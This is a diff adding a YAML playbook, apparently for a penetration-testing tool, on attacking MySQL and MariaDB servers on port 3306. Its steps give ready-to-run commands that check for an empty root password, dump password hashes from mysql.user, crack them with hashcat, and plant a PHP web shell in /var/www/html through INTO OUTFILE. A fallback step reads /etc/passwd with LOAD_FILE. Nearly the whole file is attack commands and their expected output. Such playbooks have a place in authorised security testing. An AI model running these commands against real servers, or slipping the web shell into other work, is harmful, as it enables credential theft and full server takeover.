@@ -1,0 +1,56 @@
+id: mysql
+name: MySQL / MariaDB Database Exploitation (Port 3306)
+category: network
+description: Methodology for MySQL and MariaDB database on port 3306. Covers version scanning, remote connection, dumping password hashes, and dropping web shells via INTO OUTFILE.
+port_triggers:
+  - 3306
+service_triggers:
+  - mysql
+  - mariadb
+tags:
+  - mysql
+  - mariadb
+  - database
+  - into-outfile
+steps:
+  - id: mysql-nmap-auth
+    title: MySQL Version & Empty Root Password Check
+    phase: reconnaissance
+    purpose: Scan MySQL on port 3306 to retrieve server version, verify remote connection permissions, and check for blank root passwords.
+    command: nmap -p 3306 --script mysql-enum,mysql-info,mysql-empty-password -sV {{TARGET}}
+    expected_output:
+      - '| mysql-info: Protocol: 10, Version: 10.3.27-MariaDB'
+      - '| mysql-empty-password: root account has empty password!'
+    common_mistakes:
+      - By default MySQL only binds to 127.0.0.1; if exposed externally, check for default `root` or `admin` accounts.
+    if_success: Remote access permitted! Connect using MySQL CLI.
+    if_failure: Connection rejected (Host is not allowed to connect). Look for SQLi or local port forwarding.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+  - id: mysql-dump-hashes
+    title: MySQL Database & User Hash Extraction
+    phase: enumeration
+    purpose: Connect to the database, list all available databases, and dump password hashes from `mysql.user`.
+    command: mysql -u '{{USERNAME|root}}' -p'{{PASSWORD}}' -h {{TARGET}} -e 'SHOW DATABASES; SELECT user, host, authentication_string FROM mysql.user;'
+    expected_output:
+      - '| root | % | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |'
+      - '| app_user | localhost | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |'
+    common_mistakes:
+      - MySQL 5.7+ uses `authentication_string` column instead of legacy `password`.
+    if_success: 'Hashes extracted! Crack MySQL hashes with Hashcat mode 300: `hashcat -m 300 mysql.hashes rockyou.txt`.'
+    if_failure: Access denied. Check web application configuration files for hardcoded database credentials.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+  - id: mysql-into-outfile
+    title: Web Shell Drop via INTO OUTFILE
+    phase: exploitation
+    purpose: If MySQL user has FILE privilege and webroot path is known, write a PHP web shell directly into `/var/www/html/`.
+    command: mysql -u '{{USERNAME|root}}' -p'{{PASSWORD}}' -h {{TARGET}} -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
+    expected_output:
+      - Query OK, 1 row affected (0.01 sec)
+    common_mistakes:
+      - Requires `secure_file_priv` to be empty in MySQL server configuration (`SELECT @@secure_file_priv;`).
+    if_success: Web shell written! Trigger commands via `curl "{{TARGET_URL}}/shell.php?cmd=id"`.
+    if_failure: secure_file_priv restriction or directory not writable. Read files with `LOAD_FILE("/etc/passwd")`.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
